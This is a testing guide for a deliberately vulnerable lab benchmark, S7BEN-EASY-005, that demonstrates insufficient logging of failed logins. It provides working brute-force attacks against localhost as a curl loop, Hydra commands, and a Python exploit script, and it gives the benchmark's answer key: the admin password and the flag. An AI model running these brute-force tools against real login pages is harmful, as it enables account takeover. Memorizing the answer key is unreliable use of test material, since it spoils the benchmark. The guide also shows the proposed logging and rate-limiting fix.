# S7BEN-EASY-005: Manual Testing Guide

## Vulnerability: Insufficient Logging - Brute Force Undetected

### Overview
This benchmark tests for insufficient logging of authentication failures. The application does not log failed login attempts, allowing attackers to brute force credentials without detection or rate limiting.

---

## Setup

### 1. Build and Start the Benchmark
```bash
cd benchmarks/S7BEN-EASY-005
make build
make up
```

### 2. Verify Service is Running
```bash
make test
# Should output: Health check passed
```

### 3. Access the Application
Open your browser to: http://localhost:5000

Or use curl:
```bash
curl http://localhost:5000
```

---

## Manual Testing Steps

### Step 1: Verify Login Page
```bash
curl http://localhost:5000
```

You should see the login form HTML.

### Step 2: Test Invalid Login (No Logging!)
```bash
curl -X POST http://localhost:5000/login \
  -d "username=admin&password=wrongpassword" \
  --cookie-jar cookies.txt \
  -L
```

**Expected Output:**
```html
Invalid credentials
```

### Step 3: Check Logs (Notice Failed Attempts NOT Logged)
```bash
curl http://localhost:5000/logs
```

**Expected Output:**
```json
{
  "successful_logins": [],
  "failed_logins": "NOT LOGGED - VULNERABILITY!"
}
```

This confirms the vulnerability: failed login attempts are invisible!

### Step 4: Verify Valid Login Works
```bash
curl -X POST http://localhost:5000/login \
  -d "username=admin&password=weakpass123" \
  --cookie-jar cookies.txt \
  -L
```

**Expected Output:**
Should redirect to admin dashboard with the flag.

---

## Exploitation

### Method 1: Manual Brute Force with curl

Try common passwords:
```bash
for password in "password" "admin" "admin123" "letmein" "weakpass123"; do
  echo "Trying: $password"
  response=$(curl -s -X POST http://localhost:5000/login \
    -d "username=admin&password=$password" \
    --cookie-jar cookies.txt \
    -L)

  if echo "$response" | grep -q "Flag:"; then
    echo "SUCCESS! Password is: $password"
    echo "$response" | grep -A 1 "Flag:"
    break
  fi
done
```

### Method 2: Using Hydra (Recommended)

Create a password list `passwords.txt`:
```
password
admin
admin123
123456
letmein
weakpass
weakpass123
password123
```

Run Hydra:
```bash
hydra -l admin -P passwords.txt localhost -s 5000 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

**Expected Output:**
```
[5000][http-post-form] host: localhost   login: admin   password: weakpass123
```

### Method 3: Python Script

Create `exploit.py`:
```python
import requests

URL = "http://localhost:5000"
USERNAME = "admin"
PASSWORDS = [
    "password",
    "admin",
    "admin123",
    "123456",
    "letmein",
    "weakpass",
    "weakpass123",
    "password123",
    "qwerty",
    "12345678"
]

def brute_force():
    """Brute force the admin password"""
    session = requests.Session()

    print(f"[*] Starting brute force attack on {URL}")
    print(f"[*] Target username: {USERNAME}")
    print(f"[*] Trying {len(PASSWORDS)} passwords...")
    print()

    for i, password in enumerate(PASSWORDS, 1):
        print(f"[{i}/{len(PASSWORDS)}] Trying password: {password}")

        response = session.post(
            f"{URL}/login",
            data={
                "username": USERNAME,
                "password": password
            },
            allow_redirects=True
        )

        # Check if login was successful
        if "Invalid credentials" not in response.text:
            print(f"\n[+] SUCCESS! Found password: {password}")
            print(f"[+] Retrieving flag...")

            # Get the flag from the dashboard
            if "S7BEN{" in response.text:
                # Extract flag
                flag_start = response.text.find("S7BEN{")
                flag_end = response.text.find("}", flag_start) + 1
                flag = response.text[flag_start:flag_end]
                print(f"\n{'='*50}")
                print(f"FLAG: {flag}")
                print(f"{'='*50}\n")
                return True

    print(f"\n[-] Failed to find password in provided list")
    return False

if __name__ == "__main__":
    brute_force()
```

Run the exploit:
```bash
python3 exploit.py
```

**Expected Output:**
```
[*] Starting brute force attack on http://localhost:5000
[*] Target username: admin
[*] Trying 10 passwords...

[1/10] Trying password: password
[2/10] Trying password: admin
[3/10] Trying password: admin123
[4/10] Trying password: 123456
[5/10] Trying password: letmein
[6/10] Trying password: weakpass
[7/10] Trying password: weakpass123

[+] SUCCESS! Found password: weakpass123
[+] Retrieving flag...

==================================================
FLAG: S7BEN{L0GG1NG_F41LURE_3XPL01T3D}
==================================================
```

### Method 4: Using Burp Suite Intruder

1. Intercept the login request in Burp Suite
2. Send to Intruder
3. Mark the password field as payload position
4. Load a password list
5. Start the attack
6. Look for responses with different length/status

---

## Verifying the Vulnerability

### Check Logs Before Attack
```bash
curl http://localhost:5000/logs
```

**Output:**
```json
{
  "successful_logins": [],
  "failed_logins": "NOT LOGGED - VULNERABILITY!"
}
```

### Perform Failed Login Attempts
```bash
curl -X POST http://localhost:5000/login \
  -d "username=admin&password=wrong1" -L

curl -X POST http://localhost:5000/login \
  -d "username=admin&password=wrong2" -L

curl -X POST http://localhost:5000/login \
  -d "username=admin&password=wrong3" -L
```

### Check Logs After Attack
```bash
curl http://localhost:5000/logs
```

**Output:**
```json
{
  "successful_logins": [],
  "failed_logins": "NOT LOGGED - VULNERABILITY!"
}
```

Notice: Failed attempts are still invisible!

---

## Getting the Flag

Once you successfully brute force the password (`weakpass123`):

### Using Browser:
1. Navigate to http://localhost:5000
2. Login with `admin` / `weakpass123`
3. View the flag on the admin dashboard

### Using curl:
```bash
curl -X POST http://localhost:5000/login \
  -d "username=admin&password=weakpass123" \
  --cookie-jar cookies.txt \
  -L
```

**Expected Output:**
```html
<div class="flag">S7BEN{L0GG1NG_F41LURE_3XPL01T3D}</div>
```

---

## Understanding the Vulnerability

### The Vulnerable Code (app.py:54-69)

```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')

    if username in USERS and USERS[username] == password:
        session['username'] = username

        # GOOD: Successful logins are logged
        successful_logins.append({...})

        return redirect(url_for('dashboard'))

    # VULNERABILITY: Failed login attempts are NOT logged!
    # This means:
    # - No detection of brute force attempts
    # - No security monitoring alerts
    # - No rate limiting possible

    return render_template_string(HTML_TEMPLATE, ...)
```

### Impact

Without logging failed authentication attempts:
- Attackers can try unlimited passwords
- No alerts are triggered
- Security monitoring systems see nothing
- Rate limiting cannot function
- Forensic analysis is impossible

### Proper Fix

```python
# Log ALL authentication attempts
login_attempts.append({
    'username': username,
    'success': success,
    'timestamp': datetime.now().isoformat(),
    'ip': request.remote_addr
})

# Implement rate limiting based on failed attempts
if count_recent_failures(username, ip) > 5:
    return "Account locked", 429
```

---

## Troubleshooting

### Issue: Brute force not working
**Solution:** Ensure you're using the correct username (`admin`) and your password list includes `weakpass123`.

### Issue: Service not responding
```bash
# Check if service is running
docker compose ps

# Check logs
docker compose logs app

# Restart if needed
make down && make up
```

### Issue: Can't access flag
**Solution:** Make sure you're logging in as `admin` (not `user`). Only the admin account has access to the flag.

---

## Cleanup

```bash
make down
make clean
```

---

## Success Criteria

- Successfully brute forced admin password (`weakpass123`)
- No failed login attempts appear in logs
- Flag retrieved from admin dashboard: `S7BEN{L0GG1NG_F41LURE_3XPL01T3D}`
